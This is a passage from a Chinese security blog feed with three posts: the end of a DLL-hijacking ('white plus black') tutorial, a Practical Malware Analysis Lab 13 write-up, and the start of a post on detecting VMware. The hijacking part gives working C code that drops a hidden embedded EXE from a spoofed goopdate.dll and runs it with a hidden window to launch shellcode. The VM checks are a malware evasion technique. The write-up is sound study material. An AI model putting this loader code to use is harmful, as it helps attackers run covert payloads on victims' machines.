class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        run();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后在服务端开启监控，这个时候就出现了问题，这边好像是一直发包发不过去，就没办法了，我也不知道是哪里出问题了。但是我用一个EXE进行测试，发现是没有任何问题的，于是，我就想到不如把EXE放在DLL的资源节里，然后“白加黑”释放资源，再打开exe好了。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/6.png"></p><p>将shellcode编写成一个exe，然后把它放到DLL的资源节中，当加载DLL的时候释放此exe在运行它。</p><p>释放资源</p><p>释放资源这里，一定一定要注意DLL释放资源和EXE是不同的，FindResource这几个函数第一个参数千万不能是NULL，这里要是DLL的句柄，我在这卡了好久，才发现问题。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">Free</span><span class="hljs-params">(UINT uResourceId, WCHAR* szResourceType, <span class="hljs-keyword">char</span>* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//如果是DLL的资源释放，必须加载DLL的句柄！！！！</span><br>HMODULE hDll = GetModuleHandle(<span class="hljs-string">L&quot;goopdate.dll&quot;</span>);<br><span class="hljs-comment">// 找到资源</span><br>HRSRC hRsrc = FindResource(hDll, MAKEINTRESOURCE(uResourceId), szResourceType);<span class="hljs-comment">//第一个参数不能是NULL，不然的话无法搜索到资源，其他同样</span><br><span class="hljs-keyword">if</span> (hRsrc == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取资源大小</span><br>DWORD dwSize = SizeofResource(hDll, hRsrc);<br><span class="hljs-keyword">if</span> (dwSize &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 载入资源</span><br>HGLOBAL hGlobal = LoadResource(hDll, hRsrc);<br><span class="hljs-keyword">if</span> (hGlobal == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 锁定资源，并返回指向资源第一字节的指针</span><br>LPVOID lpRes = LockResource(hGlobal);<br><span class="hljs-keyword">if</span> (lpRes == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//创建一个隐藏文件</span><br>HANDLE hFile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hFile == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>DWORD dwWriten = <span class="hljs-number">0</span>;<br>BOOL bRes = WriteFile(hFile, lpRes, dwSize, &amp;dwWriten, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (bRes == FALSE || dwWriten &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CloseHandle(hFile);<br>CloseHandle(hGlobal);<br>CloseHandle(hRsrc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>启动进程</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">Create</span><span class="hljs-params">(WCHAR* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br><span class="hljs-built_in">ZeroMemory</span>(&amp;si, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si));<br><span class="hljs-built_in">ZeroMemory</span>(&amp;pi, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pi));<br>si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><span class="hljs-comment">//隐藏窗口启动释放的exe</span><br>BOOL flag = <span class="hljs-built_in">CreateProcess</span>(szFileName, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br><span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后编译，再改名为要劫持的DLL就可以了。</p><p>将DLL属性设置为隐藏，双击运行后，会释放出加载shellcode的exe，其属性也是隐藏，然后再执行，就成功上线了。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/7.png"></p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.gif"></p><h2 id="更正"><a href="#更正" class="headerlink" title="更正"></a>更正</h2><p>经过指正，应该是我的DLL编写的有问题，并且劫持是可以去劫持一个具体的函数的，需要自己去分析一下白应用查看其调用的DLL以及其中函数。</p><p>使用IDA打开白应用，搜索loadlibrary，然后可以看到加载了要被劫持的DLL，goopdate.dll，以及获取其中的DllEntry函数。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/8.png"></p><p>然后在DLL中构造同名的导出函数DllEntry，将加载shellcode的代码放在其中，就可以成功了，这里就不再放截图了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不过暂时应该还是没有办法过杀软的，因为这个shellcode肯定是会被检测到的，不过免杀不在本篇考虑的范畴内。还有就是DLL的编写，应该是要先分析一下白应用查看其加载的具体函数，然后再编写同名导出函数，在其中实现自己的功能。应该还有其他的方法，不过目前我还没有掌握，慢慢学习吧。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21">https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/20">https://security.tencent.com/index.php/blog/msg/20</a></p><p><a href="https://blog.csdn.net/mengyafei43/article/details/10340689">https://blog.csdn.net/mengyafei43/article/details/10340689</a></p><p><a href="https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc</a></p>]]></content>
    
    
    <categories>
      
      <category>DLL劫持</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DLL劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验13</title>
    <link href="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/"/>
    <url>/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-13-1"><a href="#Lab-13-1" class="headerlink" title="Lab 13-1"></a>Lab 13-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>监控行为可以看到有大量的网络连接</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/1.png"></p><p>使用wireshark抓取数据包，可以看到如图的数据包内容。可以看到域名<a href="http://www.practicalmalwareanalysis.com还有get字段的内容v0lolu5qtfe0se9t./">www.practicalmalwareanalysis.com还有get字段的内容V0lOLU5QTFE0SE9T。</a></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2.png"></p><p>使用IDA查看程序，可以看到有两个自定义的函数<code>sub_401300</code>，<code>sub_4011C9</code>。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/3.png"></p><p>来分析一下401300，可以看到从资源节中释放出来一些资源，然后调用<code>sub_401190</code>，分析此函数发现是一个与0x3B异或的过程。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/4.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/5.png"></p><p>资源节内容</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/6.png"></p><p>异或后的结果，可以看到正是访问的域名。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/7.png"></p><p>使用IDA FindCrypt插件可以看到此程序有base64</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/8.png"></p><p>找到地方发现正是第二个函数<code>sub_4011C9</code>之中。发现其进行编码的内容是通过gethostname函数获得的主机名。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/9.png"></p><p>base64过程</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/11.png"></p><p>查看编码后的内容正是get字段的内容。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/10.png"></p><p>继续分析后面的函数，可以看到会访问这个URL<a href="http://www.practicalmalwareanalysis.com/V0lOLU5QTFE0SE9T">www.practicalmalwareanalysis.com/V0lOLU5QTFE0SE9T</a> ，然后会调用InternetReadFile来读取返回的数据，如果返回的数据等于0x6F也就是o的话，那么返回值result就不等于0，就会终止外面的循环。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/15.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/16.png"></p><h3 id="1-比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？"><a href="#1-比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？" class="headerlink" title="1.比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？"></a>1.比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？</h3><p>查看字符串，可以看到base64所用码表，Mozilla/4.0，http://%s/%s，这几个。加密的话就是base64加密，加密元素从这里不太好分析出来。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/12.png"></p><h3 id="2-使用IDA-pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？"><a href="#2-使用IDA-pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？" class="headerlink" title="2.使用IDA pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？"></a>2.使用IDA pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？</h3><p>4011B8处是3B在进行异或，那么这里重点关注一下，跟进后就是前面分析的xor解密。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/13.png"></p><h3 id="3-恶意代码使用什么密钥加密，加密了什么内容？"><a href="#3-恶意代码使用什么密钥加密，加密了什么内容？" class="headerlink" title="3.恶意代码使用什么密钥加密，加密了什么内容？"></a>3.恶意代码使用什么密钥加密，加密了什么内容？</h3><p>使用的是base64加密，加密的是主机名</p><h3 id="4-使用静态工具FindCrypt2，Krypto-ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？"><a href="#4-使用静态工具FindCrypt2，Krypto-ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？" class="headerlink" title="4.使用静态工具FindCrypt2，Krypto ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？"></a>4.使用静态工具FindCrypt2，Krypto ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？</h3><p>可以发现base64加密</p><h3 id="5-什么类型的加密被恶意代码用来发送部分网络流量？"><a href="#5-什么类型的加密被恶意代码用来发送部分网络流量？" class="headerlink" title="5.什么类型的加密被恶意代码用来发送部分网络流量？"></a>5.什么类型的加密被恶意代码用来发送部分网络流量？</h3><p>base64加密</p><h3 id="6-Base64编码函数在反汇编的何处？"><a href="#6-Base64编码函数在反汇编的何处？" class="headerlink" title="6.Base64编码函数在反汇编的何处？"></a>6.Base64编码函数在反汇编的何处？</h3><p>在反汇编的401000处</p><h3 id="7-恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？"><a href="#7-恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？" class="headerlink" title="7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？"></a>7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？</h3><p>最大长度是12，注意这里的strncpy函数，指定了长度，为12，所以最大是12。加密的内容就是主机名</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/14.png"></p><h3 id="8-恶意代码中，你是否在Base64加密数据中看到了填充字符（-或者-）？"><a href="#8-恶意代码中，你是否在Base64加密数据中看到了填充字符（-或者-）？" class="headerlink" title="8.恶意代码中，你是否在Base64加密数据中看到了填充字符（=或者==）？"></a>8.恶意代码中，你是否在Base64加密数据中看到了填充字符（=或者==）？</h3><p>并没有看到填充的字符，因为我这里主机名正好为12位，根据base64编码的特性可以知道，是每三位变为四位，所以12位刚好扩充为16位无需填充，但是如果主机名不足12位，且其不能被3整除，就会出现填充字符。</p><h3 id="9-这个恶意代码做了什么？"><a href="#9-这个恶意代码做了什么？" class="headerlink" title="9.这个恶意代码做了什么？"></a>9.这个恶意代码做了什么？</h3><p>从资源节解密出一个域名，然后通过base64加密主机名，再和域名拼接形成一个URL，访问此URL，直到返回一个特定数据才会结束。</p><h2 id="Lab-13-2"><a href="#Lab-13-2" class="headerlink" title="Lab 13-2"></a>Lab 13-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用火绒剑，可以看到有创建文件的行为，每隔一小会就会创建一个看起来是随机名称的文件。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-1.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-2.png"></p><p>使用IDA插件FindCrypt查找是否存在加密，没有找到</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-3.png"></p><p>查看主函数，看到流程很短，while循环是一个死循环，其中有两个sleep函数，还有一个<code>sub_401851</code>函数，根据火绒剑的结果分析，隔一段时间创建文件应该就是sleep函数的原因。那么这个函数应该就是创建文件的函数。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-4.png"></p><p>查看此函数，可以看到其中有一个<code>GetTickCount</code>函数，此函数获取自系统启动以来的毫秒数，然后将其拼接成为文件名tempXXX，这就解释了刚才看到那些文件名是怎么回事了。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-5.png"></p><p>看<code>sub_401070</code>函数，这是一个生成当前的屏幕截图的函数，在其中进行截图操作。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-6.png"></p><p>而<code>sub_40181F</code>函数就是加密的函数，查看其传入的参数也是内容和大小</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-7.png"></p><p>现在尝试在加密之前将图像内容给dump出来，在加密函数之前可以看到传入的参数分别是要加密的内容和大小</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-8.png"></p><p>在lordpe中转存这部分区域，之后改为BMP格式即可看到图片，确实是当前的截图</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-9.png"></p><h3 id="1-使用动态分析，确定恶意代码创建了什么？"><a href="#1-使用动态分析，确定恶意代码创建了什么？" class="headerlink" title="1.使用动态分析，确定恶意代码创建了什么？"></a>1.使用动态分析，确定恶意代码创建了什么？</h3><p>每隔一会会创建一个tempXXX文件</p><h3 id="2-使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？"><a href="#2-使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？" class="headerlink" title="2.使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？"></a>2.使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？</h3><p>没有找到很有用的东西</p><h3 id="3-基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？"><a href="#3-基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？" class="headerlink" title="3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？"></a>3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？</h3><p>CreateFile和WriteFile</p><h3 id="4-加密函数在反汇编的何处？"><a href="#4-加密函数在反汇编的何处？" class="headerlink" title="4.加密函数在反汇编的何处？"></a>4.加密函数在反汇编的何处？</h3><p>40181F</p><h3 id="5-从加密函数追溯原始的加密内容，原始加密内容是什么？"><a href="#5-从加密函数追溯原始的加密内容，原始加密内容是什么？" class="headerlink" title="5.从加密函数追溯原始的加密内容，原始加密内容是什么？"></a>5.从加密函数追溯原始的加密内容，原始加密内容是什么？</h3><p>原始的加密内容是屏幕截图</p><h3 id="6-你是否能够找到加密算法？如果没有，你如何解密这些内容？"><a href="#6-你是否能够找到加密算法？如果没有，你如何解密这些内容？" class="headerlink" title="6.你是否能够找到加密算法？如果没有，你如何解密这些内容？"></a>6.你是否能够找到加密算法？如果没有，你如何解密这些内容？</h3><p>加密算法就在<code>40181F</code>中，可以在加密之前将内容dump出来</p><h3 id="7-使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？"><a href="#7-使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？" class="headerlink" title="7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？"></a>7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？</h3><p>如详细分析中所述，那样操作。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机检测</title>
    <link href="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"/>
    <url>/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在虚拟机的应用是越来越广泛了，不论是现在流行的网游还是一些病毒都会有自己的反虚拟机机制，判断其是否是运行在虚拟机之中。我现在也学习并记录一下一些虚拟机检测的手段，因为我只使用过VMware，所以我这里只记录自己对于VMware的检测，其他类型的虚拟机暂时没有用过，所以先暂且不提。</p><p>我个人对于虚拟机检测的理解，就是检测其中的各种特征，因为虚拟机运行和真实环境是有差距的，比如一些特定的服务，硬件名称等。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>在虚拟机中运行的时候，是有特定的进程的，比如图中两个进程</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/1.png"></p><p>这时就可以编写代码去检测是否存在指定的进程。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">IfProcExist</span><span class="hljs-params">(WCHAR* Procname)</span></span><br><span class="hljs-function"></span>&#123;<br>PROCESSENTRY32 pe32 = &#123; <span class="hljs-number">0</span> &#125;;<br>pe32.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PROCESSENTRY32);<br>HANDLE hSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<span class="hljs-comment">//拍摄快照</span><br>BOOL flag = <span class="hljs-built_in">Process32First</span>(hSnap, &amp;pe32);<br><span class="hljs-keyword">while</span> (flag)<br>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wcscmp</span>(Procname, pe32.szExeFile))<span class="hljs-comment">//判断是否是指定进程</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//找到返回TRUE</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>flag = <span class="hljs-built_in">Process32Next</span>(hSnap, &amp;pe32);<span class="hljs-comment">//没有找到搜索下一个</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<span class="hljs-comment">//没有找到，不存在指定进程，返回FALSE</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>当在虚拟机运行时，检测到存在指定的进程</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/2.png"></p><p>不过这两个进程都是vmtool的进程，当我把vmtool卸载之后，就没有这两个进程了。所以如果在一个没有vmtool的环境中，可能还需要去寻找其他的一些特征来进行检测。</p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>虚拟机环境中也有许多的标志是虚拟机的注册表，可以通过查询这些注册表来判断是否处在虚拟环境之中。</p><p>比如HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Drivers这个表项</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/3.png"></p><p>可以通过尝试打开此表项，判断是否存在来作为判断依据。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">OpenReg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">L&quot;SOFTWARE\\VMware, Inc.\\VMware Drivers&quot;</span>, <span class="hljs-number">0</span>, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)<span class="hljs-comment">//是否能打开此表项</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<span 